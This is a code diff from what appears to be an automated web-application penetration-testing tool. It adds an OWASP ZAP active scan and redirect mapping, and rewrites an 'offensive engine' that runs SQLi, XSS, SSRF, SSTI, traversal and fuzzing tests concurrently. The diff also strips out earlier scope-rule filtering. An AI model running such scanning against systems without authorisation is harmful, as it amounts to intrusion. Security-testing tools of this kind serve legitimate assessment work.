+                base_host = urlparse(base_url).netloc
+                if seed_urls:
+                    same_host = [u for u in dict.fromkeys(seed_urls)
+                                 if u.startswith("http") and urlparse(u).netloc == base_host
+                                 and u.rstrip("/") != base_url.rstrip("/")]
+                    # Parameterized endpoints first — those are what the active
+                    # scanner actually exercises for injection.
+                    same_host.sort(key=lambda u: 0 if ("?" in u and "=" in u) else 1)
+                    seeds = same_host[:MAX_ZAP_SEED]
+                    seeded = 0
+                    for u in seeds:
+                        try:
+                            await _get(c, "/JSON/core/action/accessUrl/",
+                                       {"url": u, "followRedirects": "true"})
+                            seeded += 1
+                        except Exception:
+                            continue
+                    if seeded:
+                        await self.log(f"Seeded {seeded} discovered endpoints into ZAP tree", "info")
+
+                # Spider to build the site tree.
+                spider_id = (await _get(c, "/JSON/spider/action/scan/", {"url": base_url, "recurse": "true"})).get("scan")
+                await self.log("ZAP spider crawling", "info")
+                for _ in range(40):
+                    await asyncio.sleep(5)
+                    st = (await _get(c, "/JSON/spider/view/status/", {"scanId": spider_id})).get("status", "0")
+                    if int(st) >= 100:
+                        break
+
+                # Let the passive scanner drain the spidered records.
+                for _ in range(12):
+                    recs = (await _get(c, "/JSON/pscan/view/recordsToScan/", {})).get("recordsToScan", "0")
+                    if int(recs) == 0:
+                        break
+                    await asyncio.sleep(5)
+
+                # Active scan: the real DAST work.
+                ascan_id = (await _get(c, "/JSON/ascan/action/scan/",
+                                       {"url": base_url, "recurse": "true", "inScopeOnly": "false"})).get("scan")
+                if ascan_id is None:
+                    await self.log("ZAP active scan could not start", "warn")
+                else:
+                    await self.log("ZAP active scan running (slow phase)", "info")
+                    last = -1
+                    for _ in range(150):
+                        await asyncio.sleep(5)
+                        sti = int((await _get(c, "/JSON/ascan/view/status/", {"scanId": ascan_id})).get("status", "0"))
+                        if sti >= last + 25 and sti < 100:
+                            await self.log(f"ZAP active scan {sti}%", "info")
+                            last = sti
+                        if sti >= 100:
+                            break
+
+                raw = await _get(c, "/JSON/core/view/alerts/",
+                                 {"baseurl": base_url, "start": "0", "count": "1000"})
+                alerts = raw.get("alerts", [])
+
+            RISK = {"High": ("high", 8.0), "Medium": ("medium", 5.5), "Low": ("low", 3.5)}
+            # Consolidate by alert type. ZAP fires the same rule on every URL, so
+            # one missing header becomes 100+ rows. Group them into one finding
+            # and keep every affected URL listed as a PoC target underneath.
+            groups = {}
+            for a in alerts:
+                risk = a.get("risk", "")
+                if risk not in RISK:
+                    continue
+                name = a.get("alert") or a.get("name", "ZAP alert")
+                g = groups.setdefault((name, risk), {
+                    "urls": [], "params": set(),
+                    "cwe": a.get("cweid", ""),
+                    "description": a.get("description", ""),
+                    "solution": a.get("solution", ""),
+                    "evidence": a.get("evidence", ""),
+                    "attack": a.get("attack", ""),
+                })
+                u = a.get("url", "")
+                if u and u not in g["urls"]:
+                    g["urls"].append(u)
+                if a.get("param"):
+                    g["params"].add(a["param"])
+
+            order = {"High": 0, "Medium": 1, "Low": 2}
+            for (name, risk), g in sorted(groups.items(),
+                                          key=lambda kv: (order[kv[0][1]], -len(kv[1]["urls"]))):
+                sev, cvss = RISK[risk]
+                urls = g["urls"]
+                count = len(urls)
+                shown = urls[:40]
+                findings.append({"name": name, "risk": risk, "instances": count, "urls": urls})
+                ev = [f"Affected instances: {count}"]
+                if g["params"]:
+                    ev.append("Parameters: " + ", ".join(sorted(g["params"])[:25]))
+                if g["attack"]:
+                    ev.append("Attack: " + g["attack"])
+                if g["evidence"]:
+                    ev.append("Sample evidence: " + g["evidence"])
+                if g["cwe"]:
+                    ev.append("CWE-" + str(g["cwe"]))
+                ev.append("Affected URLs" + (f" (first 40 of {count})" if count > 40 else "") + ":")
+                ev.extend("  " + u for u in shown)
+                await self.add_finding(
+                    title=f"[ZAP] {name}" + (f" ({count} instances)" if count > 1 else ""),
+                    severity=sev,
+                    description=(g["description"] or f"OWASP ZAP flagged {name}.")[:1500],
+                    evidence="\n".join(ev)[:4000],
+                    cvss_score=cvss,
+                    remediation=(g["solution"] or "Review the ZAP alert and apply the recommended fix.")[:900],
+                )
+
+            await self.log(f"OWASP ZAP scan complete: {len(findings)} alerts (High/Med/Low)",
+                           "success" if findings else "info")
+        except Exception as e:
+            await self.log(f"ZAP active scan error: {e}", "warn")
+
+        return findings
+
+    async def map_redirects(self, base_url: str, urls: list, cap: int = 40) -> list:
+        """Record same-host redirect edges (3xx Location) across discovered URLs so
+        the topology can draw how endpoints hop to each other. Returns a list of
+        {from, to, status} (path -> path). Fast: no-follow GETs, capped."""
+        import httpx
+        base_host = urlparse(base_url).netloc
+        targets = list(dict.fromkeys([base_url] + list(urls)))[:cap]
+        seen, edges = set(), []
+        try:
+            async with httpx.AsyncClient(timeout=8, verify=False, follow_redirects=False,
+                                         headers=self._auth_headers()) as c:
+                for u in targets:
+                    try:
+                        r = await c.get(u)
+                    except Exception:
+                        continue
+                    if r.status_code not in (301, 302, 303, 307, 308):
+                        continue
+                    loc = r.headers.get("location", "")
+                    if not loc:
+                        continue
+                    dest = urlparse(urljoin(u, loc))
+                    if dest.netloc and dest.netloc != base_host:
+                        continue  # off-host redirect: not a tree node, keep it out
+                    frm = urlparse(u).path or "/"
+                    to = dest.path or "/"
+                    if frm == to:
+                        continue
+                    key = (frm, to)
+                    if key in seen:
+                        continue
+                    seen.add(key)
+                    edges.append({"from": frm, "to": to, "status": r.status_code})
+        except Exception as e:
+            await self.log(f"Redirect mapping skipped: {e}", "warn")
+        if edges:
+            await self.log(f"Redirect map: {len(edges)} redirect edge(s)", "info")
+        return edges
+
+    async def run_offensive(self, base_url: str, extra_wordlists: list = None, credentials: dict = None) -> dict:
+        await self.log(f"⚔ Offensive engine engaged against {base_url}", "info")
+        # Authenticate first (when creds are supplied) so the crawl and every
+        # scanner reuse the session. Any failure degrades to unauthenticated.
+        self._auth_cookie = await self.authenticate(base_url, credentials) if credentials else None
+        if credentials and not self._auth_cookie:
+            await self.log(
+                f"⚠ Authenticated scanning requested but login failed on {base_url}; "
+                f"testing the UNAUTHENTICATED surface only", "warn")
+        # Attack surface = active crawl (katana) + passive archive discovery
+        # (Wayback) + active param mining (arjun style), collapsed by param set.
+        crawled = await self.crawl(base_url)
+        archived = await self.gather_archive_urls(base_url)
+        mined = await self.mine_params(base_url)
+        seeded = await self.seed_endpoints(base_url)     # API/SPA endpoints crawlers miss
+        spec_urls = await self.import_api_specs(base_url)  # OpenAPI/Swagger, if exposed
+        urls = self._dedupe_by_params(
+            list(dict.fromkeys(crawled + archived + mined + seeded + spec_urls)))
+        params = len([u for u in urls if "?" in u and "=" in u])
         await self.log(
-            f"Generated {len(generated_param_urls)} parameter test URL(s) from routes, wordlist, and scope hints",
-            "success" if generated_param_urls else "info",
-        )
+            f"Attack surface: {len(urls)} unique endpoints ({params} parameterized) "
+            f"from crawl + archives + param mining + API/SPA seeding + specs", "info")
 
-        external_params = await _run_module(
-            "Arjun/x8 parameter discovery",
-            self.external_parameter_discovery(base_url, urls, scope_rules, declared_paths),
-        )
-        if external_params:
-            urls = self._dedupe_in_scope_urls(
-                [p.get("url", "") for p in external_params if isinstance(p, dict)] + urls,
-                base_url,
-                scope_rules,
-                max_urls=1000,
-            )
+        # Form/POST attack surface (logins, searches, checkout) — the inputs a
+        # URL crawler never exposes, and where auth-bypass SQLi / stored XSS live.
+        forms = await self.discover_forms([base_url] + urls)
+        redirects = await self.map_redirects(base_url, urls)  # endpoint->endpoint hops
 
-        hidden_params = await _run_module(
-            "wfuzz-style hidden parameter brute force",
-            self.hidden_parameter_bruteforce(base_url, urls, scope_rules, declared_paths),
+        # Run injection / access-control classes concurrently where safe.
+        (sqli, xss, dast, auth, trav, disco,
+         ssrf, ssti, oredir, cors, hosthdr, fuzz, formhits) = await asyncio.gather(
+            self.test_sqli(base_url, urls),
+            self.test_xss(urls),
+            self.nuclei_dast(urls),
+            self.test_auth(base_url, urls),
+            self.test_path_traversal(urls),
+            self.content_discovery(base_url, extra_wordlists),
+            self.test_ssrf(urls),
+            self.test_ssti(urls),
+            self.test_open_redirect(urls),
+            self.test_cors(base_url, urls),
+            self.test_host_header(base_url),
+            self.auto_fuzz(urls),
+            self.test_forms(forms),
+            return_exceptions=True,
         )
-        if hidden_params:
-            urls = self._dedupe_in_scope_urls(
-                urls + [h.get("url", "") for h in hidden_params if isinstance(h, dict)],
-                base_url,
-                scope_rules,
-            )
-
-        parameterized_urls = [u for u in urls if "?" in u and "=" in u]
-        traversal_candidate_urls = [
-            u for u in parameterized_urls
-            if build_traversal_probes(u, lab_mode=lab_mode, max_probes=1)
-        ]
-        idor_candidate_urls = [
-            u for u in urls
-            if build_idor_probes(u, max_probes=1)
-        ]
-        await self.log(
-            "Coverage: "
-            f"{len(urls)} in-scope URLs, "
-            f"{len(parameterized_urls)} parameterized, "
-            f"{len(traversal_candidate_urls)} traversal candidates, "
-            f"{len(idor_candidate_urls)} IDOR/BOLA candidates",
-            "info",
-        )
-
-        # Run modules sequentially because BaseAgent logging/finding writes share one DB session.
-        # Concurrent module tasks can collide inside SQLAlchemy AsyncSession and disappear as empty results.
-        sqli = await _run_module("SQLi", self.test_sqli(urls))
-        xss = await _run_module("XSS", self.test_xss(urls))
-        dast = await _run_module("Nuclei DAST", self.nuclei_dast(urls))
-        auth = await _run_module("Auth/access-control", self.test_auth(base_url, urls))
-        dependency = await _run_module("Declared dependency hints", self.check_declared_dependency_hints(declared_paths or [], base_url))
-        scope_candidates = await _run_module("Declared vulnerability hints", self.check_declared_vulnerability_hints(declared_paths or [], base_url, scope_rules))
-        traversal = await _run_module("Path traversal/LFI", self.test_path_traversal(urls, base_url, scope_rules, lab_mode))
-        idor = await _run_module("IDOR/BOLA", self.test_idor_bola(urls, base_url, scope_rules, auth_profiles))
 
         def _safe(x):
             return x if isinstance(x, list) else []
 
+        # OWASP ZAP full active scan: heavy, runs after the fast probes. Seed it
+        # with every endpoint our crawl found so ZAP scans each URL, not just root.
+        zap = await self.zap_active_scan(base_url, seed_urls=urls)
+
         result = {
             "crawled_urls": len(urls),
-            "coverage": {
-                "in_scope_urls": len(urls),
-                "parameterized_urls": len(parameterized_urls),
-                "traversal_candidate_urls": len(traversal_candidate_urls),
-                "idor_candidate_urls": len(idor_candidate_urls),
-                "content_paths_discovered": len(_safe(disco)),
-                "declared_scope_paths": len(declared_paths or []),
-                "declared_seed_urls": len(declared_seed_urls),
-                "spider_urls": len(spider_urls or []),
-                "param_mining_urls": len(_safe(param_mining)),
-                "generated_parameter_urls": len(generated_param_urls),
-                "parameter_wordlist_size": len(self._candidate_parameter_names(urls, declared_paths, limit=160)),
-                "external_parameter_candidates": len(_safe(external_params)),
-                "hidden_parameter_candidates": len(_safe(hidden_params)),
-                "lab_mode": lab_mode,
-                "auth_profiles": len(auth_profiles),
-            },
+            "endpoints": urls[:2000],   # real attack surface for the inventory
+            "redirects": redirects,     # same-host redirect edges for the topology
             "sqli": _safe(sqli),
             "xss": _safe(xss),
             "dast": _safe(dast),
             "auth": _safe(auth),
-            "dependency": _safe(dependency),
-            "scope_candidates": _safe(scope_candidates),
-            "path_traversal": _safe(traversal),
-            "idor_bola": _safe(idor),
+            "traversal": _safe(trav),
+            "zap": _safe(zap),
             "content": _safe(disco),
-            "param_mining": _safe(param_mining),
-            "generated_params": generated_param_urls,
-            "external_params": _safe(external_params),
-            "hidden_params": _safe(hidden_params),
+            "ssrf": _safe(ssrf),
+            "ssti": _safe(ssti),
+            "open_redirect": _safe(oredir),
+            "cors": _safe(cors),
+            "host_header": _safe(hosthdr),
+            "fuzz": _safe(fuzz),
+            "forms": _safe(formhits),
         }
-        total = sum(len(_safe(v)) for v in (sqli, xss, dast, auth, dependency, scope_candidates, traversal, idor))
-        await self.log(f"Offensive engine complete: {total} web-app findings across {len(urls)} in-scope URLs", "success")
+        total = sum(len(_safe(v)) for v in
+                    (sqli, xss, dast, auth, trav, zap, ssrf, ssti, oredir, cors, hosthdr, fuzz, formhits))
+        await self.log(f"⚔ Offensive engine complete: {total} injection/access/DAST findings across {len(urls)} URLs", "success")
         return result
